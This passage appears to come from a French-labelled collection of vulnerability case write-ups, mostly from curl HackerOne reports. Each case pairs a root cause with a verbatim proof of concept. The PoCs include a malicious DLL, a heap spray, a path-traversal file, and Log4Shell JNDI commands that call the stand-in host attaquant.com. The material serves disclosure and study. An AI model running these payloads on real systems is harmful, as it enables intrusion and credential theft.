**Cause racine :** req->path is kept as a non-owning pointer into connection-scoped memory that outlives the connection object, so freeing the connection during reuse leaves a dangling pointer later dereferenced.

**Preuve technique (verbatim depuis la source) :**

```
Build (ASAN):
git clone https://github.com/curl/curl.git && cd curl && autoreconf -fi
./configure --with-openssl --enable-smb --without-libpsl
make CFLAGS="-fsanitize=address -g -O0 -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address" -j$(nproc)

Repro:
python3 fake_smb_server.py 5445   # in one terminal
ASAN_OPTIONS=detect_leaks=0 LD_LIBRARY_PATH=./lib/.libs ./src/.libs/curl -u guest:guest \
  "smb://127.0.0.1:5445/share1/file1" -o /dev/null \
  "smb://127.0.0.1:5445/share2/file2" -o /dev/null
=> ASAN reports heap-use-after-free in smb_send_open().

Root cause (lib/smb.c ~398-435, smb_parse_url_path()):
smbc->share = strdup(path)          // allocates "share2/file2"
// '/' replaced with '\0' -> "share2\0file2\0"
req->path = slash                    // points 7 bytes INTO smbc->share (non-owning pointer)

On connection reuse for URL #2: url_find_or_create_conn() frees the needle connection -> Curl_conn_free() -> smb_conn_dtor() -> free(smbc->share). req->path on the easy handle now dangles.
Then smb_request_state() -> smb_send_open():
const size_t byte_count = strlen(req->path) + 1;  // UAF read of freed heap
```

**Techniques :** use-after-free, dangling pointer into freed connection buffer, connection pooling/reuse, non-owning pointer aliasing

**Correspond aux classes qualifiantes :** memory-corruption, protocol-vulnerability

**Signal (endpoints/fonctions observés) :**
- `lib/smb.c: smb_send_open()`
- `lib/smb.c: smb_parse_url_path()`
- `lib/smb.c: smb_conn_dtor()`

**Paramètres impliqués :** `-u`, `-o`, `smb://host/share/file`

---

### DLL Side-Loading Vulnerability in Sony Music Center for PC Ver. 2.7.2

**📄 Cas réel**
[source](https://hackerone.com/reports/3355766)

Sony Music Center for PC searches the system PATH for a DLL (z-bes.dll) it no longer legitimately uses, following an unsafe DLL search order. An attacker with local access can drop a malicious z-bes.dll into any PATH directory; when the app launches, Windows loads and executes the attacker's DLL through DllMain, giving code execution in the context of the trusted application. Confirmed via Procmon and a PoC DLL that spawns calc.exe.

**Cause racine :** The application relies on the default Windows PATH-based DLL search order for a DLL it no longer needs, instead of loading it via a fully qualified path.

**Preuve technique (verbatim depuis la source) :**

```
Discovery: Procmon shows the app searching PATH for a missing DLL "z-bes.dll" (e.g. C:\Program Files\Git\cmd\z-bes.dll, C:\Users\<user>\Desktop\tools\z-bes.dll ...).

Malicious DLL (Calc.c, compiled to z-bes.dll):
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("calc.exe");
            break;
        case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break;
    }
    return TRUE;
}

Repro: drop the compiled DLL into ANY directory already present in the system PATH (e.g. C:\Users\<user>\Desktop\tools\) -> relaunch the app -> calc.exe pops, confirmed via Procmon showing the malicious DLL mapped and its DllMain executed. MITRE ATT&CK T1574/001.
```

**Techniques :** DLL search order hijacking, PATH environment abuse, missing-DLL side-loading, code execution via DllMain

**Correspond aux classes qualifiantes :** rce

**Signal (endpoints/fonctions observés) :**
- `z-bes.dll (missing DLL searched via PATH)`

---

### Fail-Open in pyOpenSSL's set_tlsext_servername_callback via Unhandled Exceptions

**📄 Cas réel**
[source](https://hackerone.com/reports/3558277)

pyOpenSSL's SNI callback wrapper invokes the user-supplied callback and always returns SSL_TLSEXT_ERR_OK to OpenSSL regardless of outcome. When the callback raises an exception, CFFI catches it, prints a traceback, and the wrapper still returns OK, telling OpenSSL SNI validation succeeded. Any developer using this callback to enforce access control will have that control silently bypassed whenever it throws, because the library fails open instead of failing closed.

**Cause racine :** The SNI callback wrapper does not translate exceptions raised in the user callback into an OpenSSL failure return code, always returning success regardless of whether the callback succeeded.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable wrapper (src/OpenSSL/SSL.py):
@wraps(callback)
def wrapper(ssl, alert, arg):
    callback(Connection._reverse_mapping[ssl])
    return 0  # ALWAYS returns Success / SSL_TLSEXT_ERR_OK, even if callback() raised

Full PoC (server-side callback deliberately raises; client still gets a completed handshake + data):
import socket, threading, time
from OpenSSL import SSL, crypto

def crashing_callback(connection):
    raise ValueError("Critical Security Check Failed!")

def start_server():
    context = SSL.Context(SSL.TLS_SERVER_METHOD)
    context.use_privatekey(key); context.use_certificate(cert)
    context.set_tlsext_servername_callback(crashing_callback)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('localhost', 4433)); server.listen(1)
    conn, addr = server.accept()
    ssl_conn = SSL.Connection(context, conn); ssl_conn.set_accept_state()
    ssl_conn.do_handshake()  # succeeds despite crashing_callback raising
    ssl_conn.sendall(b"VULNERABILITY CONFIRMED: Connection Accepted")

def start_client():
    time.sleep(1)
    context = SSL.Context(SSL.TLS_CLIENT_METHOD)
    context.set_verify(SSL.VERIFY_NONE, lambda *args: True)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.connect(('localhost', 4433))
    ssl_conn = SSL.Connection(context, sock); ssl_conn.set_connect_state()
    ssl_conn.set_tlsext_host_name(b"test.local")
    ssl_conn.do_handshake()
    print(ssl_conn.recv(1024).decode())  # prints 'VULNERABILITY CONFIRMED...'
# Output observed: [SERVER] Callback executing... Raising Exception! -- then handshake completes anyway.
```

**Techniques :** fail-open error handling, unhandled exception in security callback, SNI validation bypass, silent exception swallowing via CFFI

**Correspond aux classes qualifiantes :** auth-bypass, protocol-vulnerability

**Signal (endpoints/fonctions observés) :**
- `src/OpenSSL/SSL.py: set_tlsext_servername_callback()`
- `src/OpenSSL/SSL.py: wrapper() (CFFI SNI callback shim)`

---

### Path Traversal in protodump's writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes

**📄 Cas réel**
[source](https://hackerone.com/reports/3634571)

protodump derives output filenames from descriptor-controlled metadata (name/go_package fields of an attacker-supplied protobuf blob) and enforces output-directory containment with a lexical strings.HasPrefix(base, outputDirAbs) check. Because this only compares string prefixes rather than true path boundaries, a crafted descriptor name containing ../ can resolve into a sibling directory sharing the same string prefix (e.g. /tmp/out_pwn vs /tmp/out), letting writes land outside the intended output folder.

**Cause racine :** Output-directory containment is validated with a naive string-prefix comparison instead of a proper path-boundary check, so a sibling directory prefixed by the target directory's name passes the check despite being outside it.

**Preuve technique (verbatim depuis la source) :**

```
Craft malicious descriptor (name = ../out_pwn/evil.proto, protobuf varint-length-prefixed field):
name = b'../out_pwn/evil.proto'
with open('/tmp/evil.bin', 'wb') as f:
    f.write(bytes([0x0a, len(name)]) + name + b'\x00')

Prep prefix-collision sibling dirs:
mkdir -p /tmp/out /tmp/out_pwn

Run:
/tmp/protodump -file /tmp/evil.bin -output /tmp/out
# => Wrote /tmp/out_pwn/evil.proto
ls /tmp/out        # empty
ls /tmp/out_pwn     # evil.proto  <-- written OUTSIDE the intended -output dir

Root cause chain:
pkg/protodump/proto.go#L47-L55  Filename() builds paths from descriptor-controlled go_package/path fields.
cmd/protodump/main.go#L98-L100  attacker-influenced filename passed straight into writeFile(...).
cmd/protodump/main.go#L32-L35   path.Clean(fileDir) then joined under output -- traversal tokens survive as parent/sibling movement.
cmd/protodump/main.go#L41-L47   containment check: strings.HasPrefix(base, outputDirAbs) -- LEXICAL prefix match, not a real path-boundary check -- /tmp/out_pwn passes because it string-starts-with /tmp/out.
cmd/protodump/main.go#L51-L58   MkdirAll + WriteFile execute on the unchecked path.
```

**Techniques :** path traversal, lexical prefix-check bypass, sibling/prefix-collision directory, descriptor-controlled filename

**Correspond aux classes qualifiantes :** path-traversal

**Signal (endpoints/fonctions observés) :**
- `pkg/protodump/proto.go: Filename()`
- `cmd/protodump/main.go: writeFile()`
- `cmd/protodump/main.go: strings.HasPrefix(base, outputDirAbs) containment check`

**Paramètres impliqués :** `-file`, `-output`, `name (descriptor field)`, `go_package`

---

### CVE-2026-8926: curl combines a .netrc password for one user with a different URL-supplied username

**📄 Cas réel**
[source](https://hackerone.com/reports/3735184)

curl/libcurl can combine a username supplied in a URL with a password from an unrelated .netrc entry when the .netrc login does not match that URL username. For example, if .netrc holds credentials for alice, and a URL contains username bob, curl sends 'bob:alice_password' as HTTP Basic auth — violating curl's documented per-user netrc lookup behavior. This can leak a stored .netrc password under the wrong username, especially dangerous for libcurl-based apps fetching attacker-controlled URLs with CURLOPT_NETRC enabled.

**Cause racine :** curl's netrc handling doesn't verify that the username embedded in the URL actually matches the login the .netrc password was recorded for before combining them into an Authorization header.

**Preuve technique (verbatim depuis la source) :**

```
.netrc:
machine 127.0.0.1 login alice password secret

Request (note: URL username is bob, NOT alice):
curl --netrc-optional http://bob@127.0.0.1:18080/

Sent header (decoded):
Authorization: Basic Ym9iOnNlY3JldA==   ->  bob:secret
-- alice's password ("secret") sent under URL-supplied username "bob", violating curl's documented per-username netrc lookup (should be bob: with no password, or no header at all).

Minimal PoC (bash, self-contained):
cat >"$tmp/home/.netrc" <<'EOF'
machine 127.0.0.1 login alice password secret
EOF
chmod 0600 "$tmp/home/.netrc"
# python http.server logs Authorization header + base64-decodes it
HOME="$tmp/home" curl --silent --show-error --netrc-optional "http://bob@127.0.0.1:18080/"
# server log: Authorization: Basic Ym9iOnNlY3JldA==  /  Decoded: bob:secret

Exists since e9b9bbac22c26cf67316fa8e6c6b9e831af31949 (2024-11-15); flagged once by an automated scanner (PR #20932 comment) and dismissed/closed without a real fix.
```

**Techniques :** netrc credential mismatch, username/password decoupling, URL-embedded username injection

**Paramètres impliqués :** `--netrc-optional`, `--netrc`

---

### CVE-2026-8927: Stale Digest proxy auth state leaks across proxies when switching via environment variables

**📄 Cas réel**
[source](https://hackerone.com/reports/3744543)

An incomplete-fix variant of a prior CVE: switching a libcurl easy handle's proxy via CURLOPT_PROXY correctly clears stale Digest auth state, but the same cleanup does not happen when the effective proxy changes through environment variables (http_proxy/ALL_PROXY). Reusing the handle after an env-var proxy switch causes the new proxy to receive a Proxy-Authorization: Digest header generated from the previous proxy's challenge, which was captured and successfully replayed against the original proxy in testing.

**Cause racine :** libcurl's proxy-auth-state cleanup logic is only triggered on explicit CURLOPT_PROXY changes, not when the effective proxy changes via environment-variable resolution, so Digest state from one proxy persists and is sent to a different, unrelated proxy.

**Preuve technique (verbatim depuis la source) :**

```
Explicit CURLOPT_PROXY switch IS correctly fixed (control, no leak):
CURLOPT_PROXY proxyA -> CURLOPT_PROXY proxyB  =>  no stale Proxy-Authorization sent to proxyB

BUT switching the EFFECTIVE proxy via environment variable on a REUSED easy handle still leaks:
setenv("http_proxy", envA, 1); curl_easy_perform(h);  /* Digest-authenticates to proxyA */
setenv("http_proxy", envB, 1); curl_easy_perform(h);  /* same handle, now targets proxyB */

Request actually received by proxyB:
GET http://example.test/protected HTTP/1.1
Host: example.test
Proxy-Authorization: Digest username="silly", realm="realmA", nonce="nonceA", uri="/protected", ...
# realmA/nonceA were issued by proxyA, not proxyB -- and the captured header was successfully replayed against proxyA in the full PoC.

Control matrix from the writeup:
same handle + env http_proxy A->B   : VULNERABLE (stale Digest sent)
same handle + env ALL_PROXY A->B    : VULNERABLE (stale Digest sent)
explicit CURLOPT_PROXY A->B         : not vulnerable
new easy handle for 2nd request     : not vulnerable
curl_easy_reset() before 2nd request: not vulnerable
CURLOPT_PROXY=NULL before 2nd request: not vulnerable

Incomplete-fix variant of CVE-2026-7168 (that fix covered explicit CURLOPT_PROXY changes only, not env-var-resolved proxy changes). Suggested fix: apply the same proxy-auth state clear (data->state.proxydigest, data->state.authproxy) whenever the RESOLVED proxy changes between transfers, regardless of whether the change came from CURLOPT_PROXY or environment variables.
```

**Techniques :** stale auth state on handle reuse, proxy switch via env var not clearing Digest state, Digest replay

**Paramètres impliqués :** `http_proxy`, `ALL_PROXY`, `CURLOPT_PROXY`

---

### CVE-2026-8932: Connection reuse ignores client-cert key/password fields, letting one handle inherit another's authenticated mTLS identity

**📄 Cas réel**
[source](https://hackerone.com/reports/3733910)

An earlier fix for connection-reuse TLS-detail checking moved SSL knobs into a struct compared on reuse, but left the mTLS credential half (SSLKEY, KEYPASSWD, key type/blob) in an uncompared struct. Two easy handles sharing a connection pool that differ only on these fields can reuse each other's authenticated TLS connection — demonstrated with a handle using the correct key passphrase and a second handle using a deliberately wrong passphrase, which nonetheless reused the first handle's connection and was seen by the server under the first handle's client certificate identity.

**Cause racine :** The connection-reuse comparison function only diffs a subset of TLS configuration fields and omits the client-certificate key/passphrase/type fields, so handles with different (even invalid) mTLS credentials are treated as interchangeable for connection reuse.

**Preuve technique (verbatim depuis la source) :**

```
Root cause: match_ssl_primary_config (lib/vtls/vtls.c:194-225) only diffs struct ssl_primary_config. CURLOPT_KEYPASSWD/SSLKEY/SSLKEY_BLOB/SSLKEYTYPE/SSLCERTTYPE live in the SEPARATE struct ssl_config_data (never compared) -- an incomplete fix of CVE-2022-27782, which moved some but not all mTLS-relevant fields into the compared struct. Same gap in the TLS session-cache key (lib/vtls/vtls_scache.c): Curl_ssl_peer_key_make() adds a literal fixed ":CCERT" marker for ANY client cert instead of hashing the actual cert path -- so the scache key is identical regardless of which cert/key is set.

PoC: two easy handles A and B share one connection pool (CURLSHOPT_SHARE + CURL_LOCK_DATA_CONNECT + CURL_LOCK_DATA_SSL_SESSION), same SSLCERT/SSLKEY, but A has the CORRECT KEYPASSWD="aaa" and B has a deliberately WRONG KEYPASSWD="wrong-password".
curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);
curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_SSL_SESSION);
... curl_easy_setopt(A, CURLOPT_KEYPASSWD, "aaa");    // correct
... curl_easy_setopt(B, CURLOPT_KEYPASSWD, "wrong-password");  // wrong, never validated

Observed:
=== Request A (correct passwd) === code=200 conn_id=0
=== Request B (WRONG passwd) === * Reusing existing https: connection with host server.test -> code=200 conn_id=0 (SAME conn_id as A!)
*** B REUSED A's CONNECTION. B's wrong KEYPASSWD was never validated. ***
Server log confirms both requests hit the SAME TLS connection under the SAME client identity:
[server] conn=7db7846f5470 req#1 client_subject=commonName=alice
[server] conn=7db7846f5470 req#2 client_subject=commonName=alice
Control: B run standalone (not sharing A's pool) correctly fails eagerly with CURLE_SSL_CERTPROBLEM (43) -- confirms the gap is specifically in the reuse-matching DECISION, not in key loading itself. Impact: any app mapping mTLS client identity to authorization (per-service API keys, client-cert RBAC) can have one handle silently impersonate another's authenticated identity within the same process.
```

**Techniques :** incomplete-fix-of-prior-cve, connection-reuse-identity-confusion, mtls-key-passphrase-not-compared, tls-session-cache-gap

**Correspond aux classes qualifiantes :** auth-bypass

**Signal (endpoints/fonctions observés) :**
- `lib/vtls/vtls.c: match_ssl_primary_config()`
- `lib/vtls/vtls_scache.c: Curl_ssl_peer_key_make()`

**Paramètres impliqués :** `SSLKEY`, `SSLKEY_BLOB`, `KEYPASSWD`, `SSLKEYTYPE`, `SSLCERTTYPE`

---

### CVE-2026-9079: CURLOPT_PROXYUSERPWD leaves a stale proxy password after being replaced or cleared

**📄 Cas réel**
sévérité : high · CWE-226 · [source](https://hackerone.com/reports/3750295)

libcurl documents that CURLOPT_PROXYUSERPWD overrides on repeated sets and that NULL disables it, but the setter only replaces the internal username/password fields when the new value actually contains that component — an old password is never cleared when a later call sets a username-only value or NULL. On a reused easy handle, a later low-trust task inheriting the handle sends the earlier high-trust task's stale proxy password to a new proxy, verified end-to-end: after setting victim:secret then attacker (username only) then NULL, the proxy still received Basic auth for attacker:secret.

**Cause racine :** The CURLOPT_PROXYUSERPWD setter replaces the internal username/password only when the corresponding component is present in the new value, never clearing the previously stored password when it is omitted or the option is set to NULL.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable setter (lib/setopt.c, CURLOPT_PROXYUSERPWD -- replaces username/password ONLY when that component is present in the NEW value, never clears the old one otherwise):
case CURLOPT_PROXYUSERPWD: {
  char *u = NULL, *p = NULL;
  result = setstropt_userpwd(ptr, &u, &p);
  if(!result && u) { curlx_safefree(s->str[STRING_PROXYUSERNAME]); result = Curl_urldecode(u, 0, &s->str[STRING_PROXYUSERNAME], NULL, REJECT_ZERO); }
  if(!result && p) { curlx_safefree(s->str[STRING_PROXYPASSWORD]); result = Curl_urldecode(p, 0, &s->str[STRING_PROXYPASSWORD], NULL, REJECT_ZERO); }

Repro sequence on ONE reused easy handle:
1) CURLOPT_PROXYUSERPWD = "victim:secret"      -> internal state: victim / secret
2) CURLOPT_PROXYUSERPWD = "attacker" (username-only) -> internal state becomes attacker / secret (password NEVER cleared)
3) CURLOPT_PROXYUSERPWD = NULL (documented "disable")  -> internal state STILL attacker / secret (nothing cleared)

Captured proxy traffic (docker-based PoC, Alpine 3.20 libcurl 8.14.1-r2):
GET http://example.invalid/ auth=Basic dmljdGltOnNlY3JldA== decoded=victim:secret
GET http://example.invalid/ auth=Basic YXR0YWNrZXI6c2VjcmV0 decoded=attacker:secret   <- password leaked after username-only reset
GET http://example.invalid/ auth=Basic YXR0YWNrZXI6c2VjcmV0 decoded=attacker:secret   <- password STILL sent after NULL "clear"
[poc] VULNERABLE: stale proxy password was sent after replacement/clear
Affected 8.8.0 <= libcurl <= 8.20.0 (introduced by commit d5e83eb745762f48d8fafadc5df5dd3ae8d8941e). Attack scenario: high-trust task A sets real proxy creds, low-trust task B reuses the same handle and only supplies a username or NULL trying to clear it -- B's proxy silently receives A's real password.
```

**Techniques :** stale-credential-retention, documented-clear-semantics-violation, handle-reuse-cross-tenant-leak

**Signal (endpoints/fonctions observés) :**
- `lib/setopt.c: CURLOPT_PROXYUSERPWD setter`

**Paramètres impliqués :** `CURLOPT_PROXYUSERPWD`

---

### CVE-2026-9080: Heap use-after-free in mev_sh_entry_update() via curl_easy_pause() called from CURLMOPT_SOCKETFUNCTION

**📄 Cas réel**
[source](https://hackerone.com/reports/3749204)

curl documents curl_easy_pause() as safely callable from any callback, including CURLMOPT_SOCKETFUNCTION. Calling it from the socket callback re-enters the multi event assessment logic, which — if the pause empties the transfer's poll-set — can free the very mev_sh_entry object that the outer function is still about to write to, causing an ASAN-confirmed heap use-after-free (bit-field write on a freed struct).

**Cause racine :** mev_sh_entry_update() writes to its entry pointer after invoking the application's socket callback without checking whether that callback (via a legal, documented re-entrant curl_easy_pause() call) caused the entry to be freed during the callback.

**Preuve technique (verbatim depuis la source) :**

```
Root cause (lib/multi_ev.c, mev_sh_entry_update() -- writes to `entry` AFTER invoking the app's socket callback, without checking whether that callback (via a legal, documented curl_easy_pause() re-entrant call) caused `entry` to be freed):
mev_in_callback(multi, TRUE);
rc = multi->socket_cb(data, s, comboaction, multi->socket_userp, entry->user_data);  /* app callback fires -> can call curl_easy_pause() -> re-enters mev_assess() -> may FREE entry */
mev_in_callback(multi, FALSE);
entry->announced = TRUE;   /* UAF WRITE -- bit-field write = read-modify-write, what ASAN catches first */
entry->action = (unsigned int)comboaction;  /* UAF WRITE */

App-side trigger (sock_cb, called from CURLMOPT_SOCKETFUNCTION): calling curl_easy_pause(easy, CURLPAUSE_RECV) when the socket transitions to POLL_IN empties the transfer's poll-set, causing mev_forget_socket() -> mev_sh_entry_kill() -> free(entry) DURING the callback that mev_sh_entry_update() is still executing.

ASAN confirms exact double-role of the pointer:
READ of size 1 at 0x60b00000342c ... in mev_sh_entry_update multi_ev.c:275
freed by thread T0 here: ... in mev_sh_entry_kill multi_ev.c:123 ... in curl_easy_pause easy.c:1183 ... in sock_cb poc_uaf.c:181 ... in mev_sh_entry_update multi_ev.c:272

Fix: re-fetch entry from the hash AFTER the callback returns (before writing announced/action), bail out if it's now NULL -- since curl_easy_pause() is DOCUMENTED as legal to call from any callback including CURLMOPT_SOCKETFUNCTION, this UAF is triggerable via fully-supported, non-misuse API usage. Affected 8.13.0-8.20.0 (multi_ev rewrite in 8.13.0 introduced the write, 8.16.0 added the bit-field write ASAN catches first).
```

**Techniques :** use-after-free, reentrant-callback-invalidation, asan-confirmed, documented-api-legal-reentrancy-abuse

**Correspond aux classes qualifiantes :** memory-corruption

**Signal (endpoints/fonctions observés) :**
- `lib/multi_ev.c: mev_sh_entry_update()`
- `lib/multi_ev.c: mev_assess()`
- `lib/easy.c: curl_easy_pause()`

**Paramètres impliqués :** `CURLMOPT_SOCKETFUNCTION`, `CURLPAUSE_RECV`

---

### CVE-2026-9545: HTTP/3 early data can be sent to a session-reused connection before TLS peer verification completes

**📄 Cas réel**
sévérité : medium · [source](https://hackerone.com/reports/3752888)

When curl's ngtcp2 HTTP/3 backend reuses a TLS session advertising early-data support, it marks the connection as usable before the new handshake completes, and the send path only rejects a pre-existing verification error rather than requiring a completed handshake — letting request bytes (including cookies, bearer tokens, request bodies) be sent as early data before peer certificate verification for the new connection finishes. A MITM routing the connection to a differently-certificated endpoint can observe this early data even though the final certificate check then correctly fails the connection.

**Cause racine :** The QUIC/HTTP3 send path checks only for a prior verification failure at entry and does not require a completed handshake or successful new-connection peer verification before allowing request data to be sent as early data on a reused session.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable path (lib/vquic/curl_ngtcp2.c, cf_ngtcp2_send() -- only rejects a PRE-EXISTING verification failure at entry, never requires a COMPLETED handshake for the reused/new session before sending data as early data):
if(ctx->tls_vrfy_result) { result = ctx->tls_vrfy_result; goto denied; }
// ... proceeds to open an H3 stream, buffer request bytes, and flush egress
result = Curl_bufq_write(&stream->sendbuf, buf, len, pnwritten);
if(*pnwritten > 0 && !ctx->tls_handshake_complete && ctx->use_earlydata)
  ctx->earlydata_skip += *pnwritten;   // request bytes already sent as early data BEFORE verification of the NEW connection completes

PoC: cache a valid H3 TLS session against target.example.com (cert CN=target.example.com), then MITM the second connection to a DIFFERENT server presenting an evil.example.com cert (different ticket key too):
curl --http3-only --tls-earlydata --ssl-sessions sessions.txt --cacert ca.pem --connect-to target.example.com:4433:127.0.0.1:4433 -H "Authorization: Bearer $secret" -d "secret=$secret" -sS -o /dev/null https://target.example.com:4433/

Observed on the (attacker-controlled) server side, request bytes arrived BEFORE the client's cert check failed:
http: stream 0x0 [authorization: Bearer REQUEST_SECRET_b96a057fce65e346]
curl: (60) SSL: no alternative certificate subject name matches target hostname 'target.example.com'
TEST_RESULT request_seen=yes verify_failed=yes curl_exit=60
-- confirms: the sensitive Authorization header + POST body were sent as QUIC early data and received by the MITM server BEFORE the client's own certificate verification rejected the connection. Response was correctly blocked (no data returned to curl), so impact is limited to REQUEST disclosure, not response.
```

**Techniques :** early-data-before-verification, tls-session-reuse-race, mitm-cert-substitution, request-disclosure

**Correspond aux classes qualifiantes :** protocol-vulnerability

**Signal (endpoints/fonctions observés) :**
- `lib/vquic/curl_ngtcp2.c: cf_ngtcp2_on_session_reuse()`
- `lib/vquic/curl_ngtcp2.c: cf_ngtcp2_send()`

**Paramètres impliqués :** `--tls-earlydata`, `--http3-only`

---

### CVE-2026-9546: CURLOPT_REFERER=NULL does not clear cached referer state, leaking a previous request's Referer (or recycled heap data) to a new origin

**📄 Cas réel**
sévérité : low · [source](https://hackerone.com/reports/3754343)

libcurl documents CURLOPT_REFERER=NULL as disabling the Referer header again, but doing so after a transfer leaves the cached per-handle referer pointer dangling instead of clearing it. On a reused easy handle (a documented and encouraged pattern for crawlers/fetchers), the next request can still send the previous request's Referer value to a different origin — or, if the freed heap chunk is reallocated first, send arbitrary recycled heap content as the Referer. ASan confirms the underlying heap-use-after-free, and a full PoC demonstrates a heap-sprayed marker string being sent as Referer to the next peer.

**Cause racine :** The documented CURLOPT_REFERER=NULL clear path frees the referer string but does not null the internal state.referer pointer, so the next request on a reused handle formats a dangling (or since-reallocated) pointer into the outgoing Referer header.

**Preuve technique (verbatim depuis la source) :**

```
Documented-but-broken clear sequence: CURLOPT_REFERER=NULL is documented to disable the Referer header again, but only frees set.str[STRING_SET_REFERER] -- Curl_pretransfer() never resets the separately-cached data->state.referer bufref, leaving it pointing at freed memory.

PoC (2 phases): Phase 1 sets CURLOPT_REFERER to a real value, performs a request, confirms via CURLINFO_REFERER that state.referer == the string pointer; then sets CURLOPT_REFERER=NULL and re-checks CURLINFO_REFERER -- it STILL returns the SAME (now freed) pointer:
rc = curl_easy_setopt(easy, CURLOPT_REFERER, initial_referer); do_request(easy, first_url);
curl_easy_getinfo(easy, CURLINFO_REFERER, &used_referer);            // before_clear_referer_ptr=<addr>
curl_easy_setopt(easy, CURLOPT_REFERER, NULL);                        // documented "disable"
curl_easy_getinfo(easy, CURLINFO_REFERER, &stale_referer);           // after_clear_referer_ptr=<SAME addr>
// "stale pointer persisted after CURLOPT_REFERER=NULL"
do_request(easy, second_url);   // ASAN: heap-use-after-free triggered formatting the Referer header for the NEXT request

Phase 2 (heap-spray to make the UAF exploitable for content-recycling, not just crash): a helper allocates ~4096 small blocks with an attacker-chosen marker string until one lands at EXACTLY the freed referer address, then performs the next request:
recycled = recycle_referer_chunk(stale_referer, leak_marker, &spray);  // expected_leak_referer=https://reused.invalid/BBBB...
do_request(easy, second_url);
-- server log confirms the NEXT peer received the RECYCLED heap content as the Referer header:
[*] captured /leak-second Referer:
https://reused.invalid/BBBB...
[+] vulnerable: recycled heap content was sent to the next peer as Referer
Trust-boundary scenario: multi-tenant crawler/fetcher/webhook-relay reuses one easy handle across jobs; tenant A's legitimate Referer (containing e.g. a private dashboard URL or job token) leaks -- or arbitrary recycled heap bytes leak -- to tenant B's attacker-controlled destination URL, entirely through documented, correctly-used libcurl API calls.
```

**Techniques :** stale-pointer-after-documented-clear, heap-use-after-free, heap-spray-content-recycling, cross-tenant-referer-leak

**Signal (endpoints/fonctions observés) :**
- `lib/setopt.c: CURLOPT_REFERER setter`
- `lib/transfer.c: Curl_pretransfer()`
- `lib/http.c: referer header formatting`

**Paramètres impliqués :** `CURLOPT_REFERER`, `CURLINFO_REFERER`

---

### Log4Shell (CVE-2021-44228) — RCE par injection JNDI dans Apache Log4j

**📄 Cas réel**
sévérité : critical · CWE-502

Log4j2 (versions 2.0-beta9 à 2.14.1) interprète nativement les patterns de type ${jndi:...} présents dans les messages qu'il journalise, y compris lorsque ces messages proviennent directement d'une entrée utilisateur non fiable (en-tête HTTP, champ de formulaire, nom d'utilisateur). En insérant une chaîne ${jndi:ldap://attaquant/x}, Log4j effectue une résolution JNDI vers un serveur LDAP contrôlé par l'attaquant, qui renvoie une référence vers une classe Java hébergée sur un serveur HTTP tiers. La JVM cible télécharge et instancie cette classe, exécutant le code de l'attaquant sans authentification. L'impact est une RCE pré-authentifiée sur pratiquement toute application Java utilisant Log4j2 pour journaliser des données utilisateur.

**Cause racine :** La fonctionnalité de « Message Lookup Substitution » de Log4j2 évalue des expressions ${...} directement dans le contenu logué, y compris le lookup JNDI, sans distinguer contenu de confiance et contenu utilisateur.

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 — l'attaquant héberge un serveur LDAP malveillant qui redirige vers une classe Java (via l'outil marshalsec) :
```
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://attaquant.com:8000/#Exploit' 1389
```
Et sert la classe compilée Exploit.class (constructeur exécutant une commande) via un simple serveur HTTP :
```
python3 -m http.server 8000
```
Étape 2 — injection du payload JNDI dans n'importe quel champ que l'application transmet à Log4j :
```
curl -H 'X-Api-Version: ${jndi:ldap://attaquant.com:1389/Exploit}' http://victime/api/login
```
Log4j résout ${jndi:ldap://...} lors du formatage du message de log, contacte le LDAP contrôlé, reçoit une référence javaFactory pointant vers http://attaquant.com:8000/Exploit.class, télécharge la classe et exécute son bloc statique/constructeur (ex. `Runtime.getRuntime().exec("id")`), donnant l'exécution de commande à distance. Le bypass ultérieur du correctif partiel (CVE-2021-45046) a montré que même la désactivation de JNDI par pattern n'était pas suffisante dans certaines configurations de Context Lookup.
```

**Techniques :** jndi-injection, ldap-referral-rce, log4j-lookup-abuse, rce-via-logging

**Correspond aux classes qualifiantes :** rce

**Signal (endpoints/fonctions observés) :**
- `N'importe quel endpoint dont une donnée utilisateur finit dans un appel Logger.log/info/error`
- `/login`
- `/api/*`
- `En-têtes HTTP journalisés (User-Agent, X-Forwarded-For, Referer)`

**Paramètres impliqués :** `User-Agent`, `X-Forwarded-For`, `X-Api-Version`, `Referer`, `username`

---

### Spring4Shell (CVE-2022-22965) — RCE via manipulation du ClassLoader dans Spring Framework

**📄 Cas réel**
sévérité : critical · CWE-94

Sur JDK 9+, l'objet java.lang.Class expose une propriété module accessible via le mécanisme de data-binding de Spring MVC (WebDataBinder), qui autorise par défaut la traversée de propriétés imbriquées type class.module.classLoader. Un attaquant peut ainsi manipuler à distance le ClassLoader de Tomcat, en particulier reconfigurer son AccessLogValve pour rediriger les futurs logs d'accès vers un fichier .jsp dans webapps/ROOT. En injectant du code JSP dans les en-têtes de la requête suivante (qui se retrouvent dans le log d'accès), l'attaquant obtient un webshell exécuté par le serveur, donc une RCE pré-authentifiée sur toute application Spring MVC déployée en WAR sur un Tomcat vulnérable.

**Cause racine :** Le data-binder de Spring ne bloque pas l'accès aux propriétés class.* pour les classes chargées par un ClassLoader Tomcat sur JDK 9+, permettant de repolluer récursivement les propriétés internes du serveur d'application via de simples paramètres de requête.

**Preuve technique (verbatim depuis la source) :**

```
Requête PoC historique (nécessite déploiement WAR sur Tomcat, JDK 9+, Spring MVC avec binding de paramètres sur un POJO) :
```
POST /path HTTP/1.1
Host: victime
Content-Type: application/x-www-form-urlencoded

suffix=%26pp%3d
c1=Runtime
c2=<%25
DNT=1
